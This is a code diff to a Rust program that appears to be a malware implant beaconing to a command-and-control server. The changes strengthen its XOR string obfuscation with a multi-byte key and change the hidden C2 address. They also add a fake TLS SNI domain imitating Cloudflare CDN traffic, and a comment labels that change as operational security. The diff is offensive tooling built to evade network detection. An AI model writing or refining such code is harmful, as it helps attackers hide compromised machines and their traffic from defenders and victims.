@@ -7,17 +7,17 @@ use std::net::TcpStream;
 use std::sync::Arc;
 use std::time::Duration;
 
-const XOR_KEY: u8 = 0xAB;
+const XOR_KEY: [u8; 8] = [0xAB, 0x3F, 0xD7, 0x52, 0x91, 0xE4, 0x18, 0x6C];
 
 const fn xor_encode<const N: usize>(input: &[u8; N]) -> [u8; N] {
     let mut out = [0u8; N];
     let mut i = 0;
-    while i < N { out[i] = input[i] ^ XOR_KEY; i += 1; }
+    while i < N { out[i] = input[i] ^ XOR_KEY[i % 8]; i += 1; }
     out
 }
 
 fn xor_decode(encoded: &[u8]) -> Vec<u8> {
-    encoded.iter().map(|b| b ^ XOR_KEY).collect()
+    encoded.iter().enumerate().map(|(i, b)| b ^ XOR_KEY[i % 8]).collect()
 }
 
 fn xd(encoded: &[u8]) -> String {
@@ -25,8 +25,9 @@ fn xd(encoded: &[u8]) -> String {
 }
 
 // C2
-const ENC_C2_HOST: [u8; 15] = xor_encode(b"192.168.0.108  ");
+const ENC_C2_HOST: [u8; 15] = xor_encode(b"10.37.233.204  ");
 const ENC_C2_PORT: [u8; 4] = xor_encode(b"4443");
+const ENC_SNI_DOMAIN: [u8; 22] = xor_encode(b"cdn-wss.cloudflare.com");
 const ENC_WSS_PATH: [u8; 4] = xor_encode(b"/ws ");
 
 // WS path rotation (blend with legitimate traffic)
@@ -366,7 +367,14 @@ fn connect_and_run(conn_count: u64) -> Result<(), Box<dyn std::error::Error>> {
 
     let tls_config = build_tls_config();
 
-    let server_name = host.clone().try_into().map_err(|_| "invalid dns")?;
+    // Use fake SNI domain for TLS (OPSEC: looks like legit CDN traffic)
+    let sni = xd(&ENC_SNI_DOMAIN).trim().to_string();
+    let server_name: rustls::pki_types::ServerName<'static> = sni.clone().try_into()
+        .unwrap_or_else(|_| {
+            // Fallback: try as IP address
+            let ip: std::net::IpAddr = host.parse().expect("invalid host");
+            rustls::pki_types::ServerName::IpAddress(ip.into())
+        });
     let tls_conn = rustls::ClientConnection::new(tls_config, server_name)?;
     let tls_stream = rustls::StreamOwned::new(tls_conn, tcp);
 
